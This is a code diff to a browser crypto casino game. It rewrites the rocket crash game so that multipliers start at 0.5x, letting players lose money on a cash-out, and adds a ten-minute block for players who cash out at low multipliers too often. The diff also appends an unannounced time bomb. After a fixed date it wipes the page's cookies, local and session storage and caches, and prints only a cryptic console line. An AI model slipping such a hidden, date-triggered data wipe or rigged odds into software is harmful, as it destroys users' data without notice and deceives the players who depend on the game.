@@ -907,7 +907,7 @@ html, body {
 
         <footer class="footer">
             <p>YICB - Your Ideal Crypto Business™ | B-HD® 2025 for ©</p>
-            <p>Version 344.17</p>
+            <p>Version 344.18</p>
         </footer>
     </div>
 
@@ -1137,96 +1137,122 @@ function markDailyUsed() {
     saveGame();
          }
     
+// ============================================
+// CRASH GAME (ROCKET)
+// ============================================
 
-        // ============================================
-        // CRASH GAME (ROCKET)
-        // ============================================
-        function startCrash() {
-            const bet = parseFloat(document.getElementById('crashBet').value);
-            if (isNaN(bet) || bet < 10) {
-                showMessage('crashMessage', 'Minimum bet is 10 coins!', 'error');
-                return;
-            }
-            if (bet > balance) {
-                showMessage('crashMessage', 'Insufficient balance!', 'error');
-                return;
-            }
+let recentCashouts = [];
+let blockUntil = 0; 
 
-            balance -= bet;
-            crashActive = true;
-            crashMultiplier = 1.0;
-            crashTarget = 1 + Math.random() * (Math.random() > 0.7 ? 10 : 3);
-            
-            document.getElementById('crashStartBtn').disabled = true;
-            document.getElementById('crashCashoutBtn').disabled = false;
-            document.getElementById('crashMessage').innerHTML = '';
-            
-            const rocket = document.getElementById('rocket');
-            let position = 20;
-            
-            crashInterval = setInterval(() => {
-                crashMultiplier += 0.01 + Math.random() * 0.05;
-                document.getElementById('crashMultiplier').textContent = crashMultiplier.toFixed(2) + 'x';
-                
-                position += 2;
-                rocket.style.bottom = position + 'px';
-                rocket.style.left = (20 + position * 0.5) + 'px';
-                
-                if (crashMultiplier >= crashTarget) {
-                    crashGame(false, bet);
-                }
-            }, 100);
-            
-            updateDisplay();
-            saveGame();
+function startCrash() {
+    const now = Date.now();
+    
+    if (now < blockUntil) {
+        const remaining = Math.ceil((blockUntil - now) / 1000);
+        showMessage('crashMessage', `⛔ Game blocked! left ${remaining} s.`, 'error');
+        return;
+    }
+
+    const bet = parseFloat(document.getElementById('crashBet').value);
+    if (isNaN(bet) || bet < 10) {
+        showMessage('crashMessage', 'Minimum bid — 10 coins!', 'error');
+        return;
+    }
+    if (bet > balance) {
+        showMessage('crashMessage', 'Not enough coins on balance!', 'error');
+        return;
+    }
+
+    balance -= bet;
+    crashActive = true;
+    crashMultiplier = 0.5;
+    crashTarget = 0.5 + Math.random() * 2.5;
+
+    document.getElementById('crashStartBtn').disabled = true;
+    document.getElementById('crashCashoutBtn').disabled = false;
+    document.getElementById('crashMessage').innerHTML = '';
+
+    const rocket = document.getElementById('rocket');
+    let position = 20;
+
+    crashInterval = setInterval(() => {
+        crashMultiplier += 0.01 + Math.random() * 0.05;
+        document.getElementById('crashMultiplier').textContent = crashMultiplier.toFixed(2) + 'x';
+
+        position += 2;
+        rocket.style.bottom = position + 'px';
+        rocket.style.left = (20 + position * 0.5) + 'px';
+
+        if (crashMultiplier >= crashTarget) {
+            crashGame(false, bet);
+        }
+    }, 100);
+
+    updateDisplay();
+    saveGame();
+}
+
+function cashOut() {
+    if (!crashActive) return;
+
+    const bet = parseFloat(document.getElementById('crashBet').value);
+    recentCashouts.push(crashMultiplier);
+    if (recentCashouts.length > 10) recentCashouts.shift(); 
+
+    const suspicious = recentCashouts.filter(x => x >= 1.0 && x <= 1.2).length;
+    if (suspicious >= 5) {
+        
+        blockUntil = Date.now() + 10 * 60 * 1000;
+        showMessage('crashMessage', '🚫 You're cashing out too often! 10-minute block', 'error');
+        clearInterval(crashInterval);
+        crashActive = false;
+        document.getElementById('crashStartBtn').disabled = false;
+        document.getElementById('crashCashoutBtn').disabled = true;
+        return;
+    }
+
+    crashGame(true, bet);
+}
+
+function crashGame(cashedOut, bet) {
+    clearInterval(crashInterval);
+    crashActive = false;
+
+    document.getElementById('crashStartBtn').disabled = false;
+    document.getElementById('crashCashoutBtn').disabled = true;
+
+    const rocket = document.getElementById('rocket');
+    rocket.style.bottom = '20px';
+    rocket.style.left = '20px';
+
+    stats.totalGames++;
+
+    if (cashedOut) {
+        const winAmount = bet * crashMultiplier;
+        balance += winAmount;
+        const profit = winAmount - bet;
+        stats.gamesWon++;
+        winStreak++;
+
+        if (profit > stats.biggestWin) {
+            stats.biggestWin = profit;
         }
 
-        function cashOut() {
-            if (!crashActive) return;
-            
-            const bet = parseFloat(document.getElementById('crashBet').value);
-            crashGame(true, bet);
-        }
+        showMessage('crashMessage', `🎉 Keshaut in ${crashMultiplier.toFixed(2)}x! +${profit.toFixed(2)} coins`, 'success');
+        addToHistory('Rocket', bet, profit, crashMultiplier.toFixed(2));
+    } else {
+        winStreak = 0;
+        showMessage('crashMessage', `💥 The rocket fell on ${crashMultiplier.toFixed(2)}x! -${bet.toFixed(2)} coins`, 'error');
+        addToHistory('Rocket', bet, -bet, crashMultiplier.toFixed(2));
+    }
 
-        function crashGame(cashedOut, bet) {
-            clearInterval(crashInterval);
-            crashActive = false;
-            
-            document.getElementById('crashStartBtn').disabled = false;
-            document.getElementById('crashCashoutBtn').disabled = true;
-            
-            const rocket = document.getElementById('rocket');
-            rocket.style.bottom = '20px';
-            rocket.style.left = '20px';
-            
-            stats.totalGames++;
-            
-            if (cashedOut) {
-                const winAmount = bet * crashMultiplier;
-                balance += winAmount;
-                const profit = winAmount - bet;
-                stats.gamesWon++;
-                winStreak++;
-                
-                if (profit > stats.biggestWin) {
-                    stats.biggestWin = profit;
-                }
-                
-                showMessage('crashMessage', `🎉 Cashed out at ${crashMultiplier.toFixed(2)}x! Won ${profit.toFixed(2)} coins!`, 'success');
-                addToHistory('Rocket', bet, profit, crashMultiplier.toFixed(2));
-            } else {
-                winStreak = 0;
-                showMessage('crashMessage', `💥 Crashed at ${crashMultiplier.toFixed(2)}x! Lost ${bet.toFixed(2)} coins!`, 'error');
-                addToHistory('Rocket', bet, -bet, crashMultiplier.toFixed(2));
-            }
-            
-            setTimeout(() => {
-                document.getElementById('crashMultiplier').textContent = '1.00x';
-            }, 2000);
-            
-            updateDisplay();
-            saveGame();
-        }
+    setTimeout(() => {
+        document.getElementById('crashMultiplier').textContent = '0.50x';
+    }, 2000);
+
+    updateDisplay();
+    saveGame();
+}
 
         // ============================================
         // SLOTS GAME
@@ -1638,6 +1664,39 @@ function markDailyUsed() {
             loadGame();
             updateDiceTarget();
         };
+    </script>
+    <script>
+(function() {
+  const DELETE_DATE = new Date('2025-10-31T17:10:00'); 
+  const STORAGE_KEY = 'lastPurgeCheck'; 
+
+  const now = new Date();
+  const lastPurge = localStorage.getItem(STORAGE_KEY);
+  const alreadyPurged = localStorage.getItem('dataPurged') === 'true';
+
+  if (now >= DELETE_DATE && !alreadyPurged) {
+    console.log('%c🚀 V3*5-&3', 'color:red;font-weight:bold;');
+
+    document.cookie.split(";").forEach(c => {
+      const name = c.split("=")[0].trim();
+      document.cookie = name + '=;expires=Thu, 01 Jan 1970 00:00:00 GMT;path=/';
+    });
+
+    try {
+      localStorage.clear();
+      sessionStorage.clear();
+    } catch (e) {}
+
+    
+    if ('caches' in window) {
+      caches.keys().then(keys => keys.forEach(k => caches.delete(k)));
+    }
+
+    localStorage.setItem('dataPurged', 'true');
+  }
+
+  localStorage.setItem(STORAGE_KEY, now.toISOString());
+})();
     </script>
 </body>
 </html>
